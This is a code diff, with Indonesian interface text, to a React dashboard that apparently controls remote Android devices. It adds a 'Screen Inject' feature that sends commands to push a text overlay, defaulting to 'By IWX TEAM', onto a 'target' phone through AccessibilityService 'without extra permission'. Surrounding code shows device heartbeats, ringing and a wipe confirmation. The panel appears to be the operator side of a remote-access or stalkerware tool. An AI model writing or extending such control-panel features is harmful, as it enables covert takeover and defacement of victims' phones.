@@ -84,6 +84,9 @@ export default function Dashboard() {
   const [isRinging, setIsRinging] = useState(false)
   const [ctrlBusy, setCtrlBusy]         = useState(false)
   const [showWipeConfirm, setShowWipeConfirm] = useState(false)
+  const [injectText, setInjectText]   = useState('By IWX TEAM')
+  const [isInjecting, setIsInjecting] = useState(false)
+  const [injectStatus, setInjectStatus] = useState('')
 
   const swrKey = selectedId ? `/api/device/heartbeat?deviceId=${encodeURIComponent(selectedId)}` : null
   const { data: deviceData, isLoading: swrLoading } = useSWR(
@@ -121,6 +124,35 @@ export default function Dashboard() {
     } finally {
       setCtrlBusy(false)
     }
+  }
+
+  const handleInject = async () => {
+    if (!selectedId || ctrlBusy) return
+    const text = injectText.trim() || 'By IWX TEAM'
+    setIsInjecting(true)
+    setInjectStatus('Mengirim…')
+    try {
+      await fetch('/api/device/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId: selectedId, command: 'screen_inject:' + text }),
+      })
+      setInjectStatus('✅ Overlay tampil di layar HP')
+    } catch { setInjectStatus('❌ Gagal kirim') }
+  }
+
+  const handleInjectStop = async () => {
+    if (!selectedId) return
+    setIsInjecting(false)
+    setInjectStatus('Menghapus…')
+    try {
+      await fetch('/api/device/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId: selectedId, command: 'screen_inject_stop' }),
+      })
+      setInjectStatus('🗑️ Overlay dihapus')
+    } catch { setInjectStatus('❌ Gagal') }
   }
 
   const pollResult = async (command: string, sentAt: number, timeoutMs = 18000): Promise<string> => {
@@ -474,6 +506,52 @@ export default function Dashboard() {
               </div>
             </div>
           )}
+
+          {/* ── SCREEN INJECT ──────────────────────────────────────────────────── */}
+          <div className="bg-android-surface border border-android-border rounded-xl p-4 mb-3">
+            <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
+              <Monitor size={13} /> Screen Inject
+              <span className="ml-auto text-[10px] font-normal text-android-muted normal-case">Tampilkan teks di layar HP target</span>
+            </h3>
+            {!connected ? (
+              <p className="text-android-muted text-xs py-2 text-center">Hubungkan perangkat untuk menggunakan Screen Inject</p>
+            ) : (
+              <div className="space-y-3">
+                <div className="flex gap-2">
+                  <input
+                    type="text"
+                    value={injectText}
+                    onChange={e => setInjectText(e.target.value)}
+                    placeholder="By IWX TEAM"
+                    className="flex-1 bg-android-bg border border-android-border rounded-lg px-3 py-2 text-sm text-android-text font-mono placeholder:text-android-muted/50 focus:outline-none focus:border-android-green/60"
+                  />
+                </div>
+                <div className="flex gap-2">
+                  <button
+                    onClick={handleInject}
+                    disabled={ctrlBusy}
+                    className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-semibold bg-android-green/10 border border-android-green/40 text-android-green hover:bg-android-green/20 transition-colors disabled:opacity-50"
+                  >
+                    <Monitor size={15} />
+                    Inject ke Layar
+                  </button>
+                  <button
+                    onClick={handleInjectStop}
+                    disabled={ctrlBusy}
+                    className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-semibold bg-android-red/10 border border-android-red/30 text-android-red hover:bg-android-red/20 transition-colors disabled:opacity-50"
+                  >
+                    Stop
+                  </button>
+                </div>
+                {injectStatus && (
+                  <p className="text-xs text-android-muted font-mono text-center">{injectStatus}</p>
+                )}
+                <p className="text-[10px] text-android-muted/60 text-center">
+                  Muncul di layar HP via AccessibilityService — tidak perlu permission tambahan
+                </p>
+              </div>
+            )}
+          </div>
 
           {/* Quick actions */}
           <div className="bg-android-surface border border-android-border rounded-xl p-4">
